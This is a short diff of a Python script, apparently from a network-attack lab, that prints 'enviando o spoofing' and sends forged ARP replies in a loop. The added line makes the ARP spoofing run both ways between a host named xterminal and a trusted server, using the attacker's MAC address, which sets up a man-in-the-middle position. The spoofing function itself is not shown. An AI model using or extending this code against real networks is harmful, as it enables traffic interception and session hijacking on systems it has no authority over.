@@ -60,4 +60,5 @@ print(trusted_server_mac)
 print("enviando o spoofing")
 for x in range(10):
     spoofing(xterminal_ip, xterminal_mac, trusted_server_ip, attacker_mac)
+    spoofing(trusted_server_ip, trusted_server_mac, xterminal_ip, attacker_mac)
     sleep(0.1)
